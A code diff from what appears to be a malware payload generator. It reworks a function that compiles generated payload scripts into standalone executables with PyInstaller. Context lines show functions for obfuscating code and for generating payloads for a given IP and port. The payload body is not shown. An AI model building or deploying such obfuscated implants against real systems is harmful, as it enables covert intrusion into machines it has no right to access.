@@ -435,14 +435,16 @@ def obfuscate_packed(code):
     return stub
 
 
-def try_compile_exe(py_path, output_dir="payloads"):
+def try_compile_exe(py_path, output_dir="payloads", verbose=True):
     pyinstaller = shutil.which("pyinstaller")
     if not pyinstaller:
-        return False
+        if verbose:
+            print("  [!] PyInstaller not found. Install with: pip install pyinstaller")
+        return None
 
     name = os.path.splitext(os.path.basename(py_path))[0]
     try:
-        _subprocess.run(
+        result = _subprocess.run(
             [
                 pyinstaller,
                 "--onefile",
@@ -453,10 +455,44 @@ def try_compile_exe(py_path, output_dir="payloads"):
                 name,
                 py_path,
             ],
-            check=True,
             capture_output=True,
-            timeout=120,
+            text=True,
+            timeout=180,
         )
+
+        if result.returncode != 0:
+            if verbose:
+                err = result.stderr.strip() or result.stdout.strip()
+                print(f"  [!] PyInstaller error: {err[:500]}")
+            return None
+
+        expected = os.path.join(output_dir, name)
+        if os.path.exists(expected):
+            return expected
+        expected_exe = expected + ".exe"
+        if os.path.exists(expected_exe):
+            return expected_exe
+
+        for f in os.listdir(output_dir):
+            fp = os.path.join(output_dir, f)
+            if os.path.isfile(fp) and (f == name or f == name + ".exe"):
+                os.chmod(fp, 0o755)
+                return fp
+
+        if verbose:
+            print(f"  [!] Binary not found after compilation")
+            print(f"  [!] Check {output_dir}/ for output files")
+        return None
+
+    except _subprocess.TimeoutExpired:
+        if verbose:
+            print("  [!] PyInstaller timed out (3 min)")
+        return None
+    except Exception as e:
+        if verbose:
+            print(f"  [!] Compilation error: {e}")
+        return None
+    finally:
         for p in ["build", name + ".spec"]:
             pth = os.path.join(os.getcwd(), p)
             if os.path.exists(pth):
@@ -467,9 +503,6 @@ def try_compile_exe(py_path, output_dir="payloads"):
                         os.remove(pth)
                     except Exception:
                         pass
-        return True
-    except Exception:
-        return False
 
 
 def generate_payload(ip, port, os_type="linux", key=None, obfuscation="none", compile_exe=False, output_dir="payloads", name=None):
@@ -506,13 +539,6 @@ def generate_payload(ip, port, os_type="linux", key=None, obfuscation="none", co
 
     exe_path = None
     if compile_exe:
-        exe_ok = try_compile_exe(filepath, output_dir)
-        if exe_ok:
-            exe_name = filename.replace(".py", "")
-            exe_path = os.path.join(output_dir, exe_name)
-            if os_type == "windows":
-                exe_path += ".exe"
-        else:
-            exe_path = None
+        exe_path = try_compile_exe(filepath, output_dir)
 
     return filepath, key.decode(), exe_path
